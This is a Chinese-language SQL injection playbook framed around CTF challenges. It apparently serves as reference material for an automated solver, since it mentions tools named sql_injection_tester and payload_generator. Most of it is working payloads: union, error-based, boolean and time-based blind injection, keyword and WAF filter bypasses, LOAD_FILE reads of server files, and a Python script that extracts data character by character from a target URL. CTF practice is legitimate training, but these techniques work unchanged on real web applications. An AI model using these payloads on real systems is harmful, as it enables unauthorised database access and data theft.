# SQL注入专项知识库

## CTF SQL注入解题模板

### 步骤1: 测试注入点
```sql
?id=1'          # 测试是否报错
?id=1' and '1'='1   # 测试布尔注入
?id=1' or '1'='1    # 测试认证绕过
```

### 步骤2: 检测关键字过滤
```sql
?id=1' union--      # 测试union是否被过滤
?id=1' select--     # 测试select是否被过滤
?id=1' where--      # 测试where是否被过滤
```

### 步骤3: 应用绕过技巧
如果关键字被过滤，按优先级尝试：
```sql
1. 双写: uunionnion sselectelect
2. 注释: un/**/ion sel/**/ect
3. 大小写: UnIoN SeLeCt
4. 编码: %55nion %53elect
```

### 步骤4: 确定列数
```sql
?id=1' order by 1--
?id=1' order by 2--
?id=1' order by 3--  # 继续直到报错
# 或使用union
?id=1' union select 1,2,3--
```

### 步骤5: 查找显示位
```sql
?id=1' union select 1,2,3--
# 观察页面显示哪些数字
```

### 步骤6: 获取数据库信息
```sql
?id=1' union select database(),user(),version()--
```

### 步骤7: 查表名
```sql
?id=1' union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database()--
# 如果关键字被过滤:
?id=1' uunionnion sselectelect group_concat(table_name),2,3 ffromrom infoorrmation_schema.tables wwherehere table_schema=database()--
```

### 步骤8: 查列名
```sql
?id=1' union select group_concat(column_name),2,3 from information_schema.columns where table_name='target_table'--
# 如果关键字被过滤:
?id=1' uunionnion sselectelect group_concat(column_name),2,3 ffromrom infoorrmation_schema.columns wwherehere table_name='target_table'--
```

### 步骤9: 提取数据
```sql
?id=1' union select flag,2,3 from flag_table--
# 如果关键字被过滤:
?id=1' uunionnion sselectelect flag,2,3 ffromrom flag_table--
```

## CTF Flag提取技巧

### 方法1: 搜索Flag表
```sql
# 搜索包含flag关键字的表
' UNION SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%flag%'--
' UNION SELECT table_name FROM information_schema.tables WHERE table_name REGEXP 'flag|secret|key|ctf'--

# 双写绕过版本
' UUNIONNION SSELECTELECT table_name FFROMROM infoorrmation_schema.tables WWHEREHERE table_name LIKE '%flag%'--
```

### 方法2: 搜索Flag列
```sql
# 搜索包含flag关键字的列
' UNION SELECT column_name,table_name FROM information_schema.columns WHERE column_name LIKE '%flag%'--
' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--

# 双写绕过版本
' UUNIONNION SSELECTELECT column_name,table_name FFROMROM infoorrmation_schema.columns WWHEREHERE column_name LIKE '%flag%'--
```

### 方法3: 文件读取
```sql
# MySQL LOAD_FILE
' UNION SELECT LOAD_FILE('/flag.txt')--
' UNION SELECT LOAD_FILE('/var/www/html/flag.php')--
' UNION SELECT LOAD_FILE('/home/ctf/flag')--
' UNION SELECT LOAD_FILE('C:\\flag.txt')--

# 双写绕过版本
' UUNIONNION SSELECTELECT LOAD_FILE('/flag.txt')--
```

### 方法4: 无显示位的盲注
```python
# 布尔盲注提取flag
import requests
url = "http://target.com/vuln.php"
flag = ""
for i in range(1, 100):
    for c in range(32, 127):
        payload = f"1' AND ASCII(SUBSTRING((SELECT flag FROM flags),{i},1))={c}--"
        r = requests.get(url, params={"id": payload})
        if "success" in r.text:
            flag += chr(c)
            print(f"[+] Flag: {flag}")
            if chr(c) == '}':
                break
            break
    if chr(c) == '}':
        break
```

## 关键字过滤绕过实战

### 1. 双写绕过 (最常见)
```sql
原始: UNION SELECT
双写: UUNIONNION SSELECTELECT
原理: 过滤器删除一次后仍保留完整关键字

常用映射:
- union → uunionnion
- select → sselectelect  
- where → wwherehere
- from → ffromrom
- and → aandnd
- or → oorr
- information_schema → infoorrmation_schema
```

### 2. 注释插入
```sql
UN/**/ION SE/**/LECT
UN/*comment*/ION SEL/**/ECT
/*!UNION*//*!SELECT*/
```

### 3. 大小写混淆
```sql
UnIoN SeLeCt
uNiOn sElEcT
```

### 4. 空白字符替换
```sql
UNION%0aSELECT (换行)
UNION%09SELECT (制表符)
UNION%0dSELECT (回车)
```

### 5. 编码绕过
```sql
%55NION %53ELECT (URL编码)
\u0055NION (Unicode)
```

## 实战解题流程

遇到关键字过滤时：
1. 先测试单个关键字是否被过滤: `?id=1' union--`
2. 如果被过滤，立即尝试双写: `?id=1' uunionnion--`
3. 如果双写成功，对所有关键字应用双写
4. 构造完整payload: `?id=1' uunionnion sselectelect 1,2,3--`
5. 查表: `group_concat(table_name) ffromrom infoorrmation_schema.tables wwherehere table_schema=database()`
6. 查列: `group_concat(column_name) ffromrom infoorrmation_schema.columns wwherehere table_name='target'`
7. 爆数据: `group_concat(flag) ffromrom flag_table`

## 更多WAF绕过场景

### 场景1: 空格被过滤
```sql
# 使用注释替代空格
'/**/UNION/**/SELECT/**/1,2,3--

# 使用括号
'UNION(SELECT(1),(2),(3))--

# 使用加号 (URL编码)
'+UNION+SELECT+1,2,3--

# 使用换行符
'%0aUNION%0aSELECT%0a1,2,3--
```

### 场景2: 引号被过滤
```sql
# 使用十六进制
' UNION SELECT * FROM users WHERE username=0x61646d696e--  # admin

# 使用CHAR函数
' UNION SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)--

# 使用反斜杠转义 (某些情况)
\' UNION SELECT 1,2,3--
```

### 场景3: 逗号被过滤
```sql
# 使用JOIN
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--

# 使用OFFSET (PostgreSQL)
' UNION SELECT NULL FROM users OFFSET 0 LIMIT 1--

# 使用CASE WHEN
' UNION SELECT CASE WHEN 1=1 THEN 'a' ELSE 'b' END--
```

### 场景4: 等号被过滤
```sql
# 使用LIKE
' AND username LIKE 'admin'--

# 使用REGEXP
' AND username REGEXP '^admin$'--

# 使用IN
' AND username IN ('admin')--

# 使用BETWEEN
' AND id BETWEEN 1 AND 1--
```

### 场景5: 注释符被过滤
```sql
# 使用闭合引号
' OR '1'='1

# 使用分号结束
'; SELECT 1;

# 使用NULL字节 (某些环境)
'%00

# 使用反斜杠
'\
```

### 场景6: 多重过滤组合
```sql
# 示例: 过滤了 union, select, or, and, 空格, 引号
# 使用: 双写 + 注释替代空格 + 十六进制

'/**/UUNIONNION/**/SSELECTELECT/**/0x666c6167/**/FFROMROM/**/flags--
```

## 信息提取技巧

### 报错注入 (Error-based)
```sql
# MySQL - extractvalue
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--

# MySQL - updatexml
' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--

# 双写绕过版本
' AANDND extractvalue(1,concat(0x7e,(SSELECTELECT database()),0x7e))--
```

### 布尔盲注 (Boolean-based)
```sql
# 判断条件真假
' AND LENGTH(database())>5--   # 页面正常
' AND LENGTH(database())>100-- # 页面异常

# 逐字符提取
' AND SUBSTRING(database(),1,1)='t'--
' AND ASCII(SUBSTRING(database(),1,1))=116--

# 二分法优化
' AND ASCII(SUBSTRING(database(),1,1)) BETWEEN 97 AND 122--
' AND ASCII(SUBSTRING(database(),1,1)) BETWEEN 97 AND 109--
```

### 时间盲注 (Time-based)
```sql
# MySQL
' AND IF(LENGTH(database())>5,SLEEP(5),0)--
' AND (SELECT IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(3),0))--

# PostgreSQL
' AND (SELECT CASE WHEN (LENGTH(current_database())>5) THEN pg_sleep(5) ELSE 0 END)--

# MSSQL
'; IF (LEN(DB_NAME())>5) WAITFOR DELAY '0:0:5'--
```

## SQL注入解题决策树

```
1. 测试注入点存在性
   ├─ 输入 ' " ` 观察报错
   └─ 输入 1' and '1'='1 测试布尔

2. 判断注入类型
   ├─ 有回显 → Union注入 (最快)
   ├─ 有报错 → 报错注入
   ├─ 无回显但有差异 → 布尔盲注
   └─ 完全无差异 → 时间盲注

3. 检测关键字过滤
   ├─ 测试 union, select, where, from
   ├─ 被过滤 → 尝试双写绕过
   ├─ 双写失败 → 尝试注释插入
   └─ 都失败 → 尝试编码绕过

4. 提取数据
   ├─ 查找flag表: table_name LIKE '%flag%'
   ├─ 查找flag列: column_name LIKE '%flag%'
   ├─ 直接读取: SELECT flag FROM flags
   └─ 文件读取: LOAD_FILE('/flag.txt')

5. 如果都失败
   ├─ 使用 sql_injection_tester 工具自动化测试
   ├─ 使用 payload_generator 生成更多payload
   └─ 编写Python脚本进行盲注
```

## 常见题型示例

### 类型1: 简单关键字过滤 (如BabySQL)
- 特征: 使用replace()过滤关键字
- 解法: 双写绕过
- Payload: `uunionnion sselectelect`

### 类型2: Union注入
- 特征: 有显示位
- 解法: 确定列数 → 查表 → 查列 → 提取数据
- Payload: `' union select 1,flag,3 from flags--`

### 类型3: 布尔盲注
- 特征: 无显示位，但有页面差异
- 解法: 逐字符提取
- Payload: `' and substring(database(),1,1)='t'--`

### 类型4: 时间盲注
- 特征: 完全无差异
- 解法: 通过延迟判断
- Payload: `' and if(length(database())>5,sleep(3),0)--`

### 类型5: 报错注入
- 特征: 显示SQL错误信息
- 解法: 利用报错函数提取数据
- Payload: `' and extractvalue(1,concat(0x7e,database()))--`
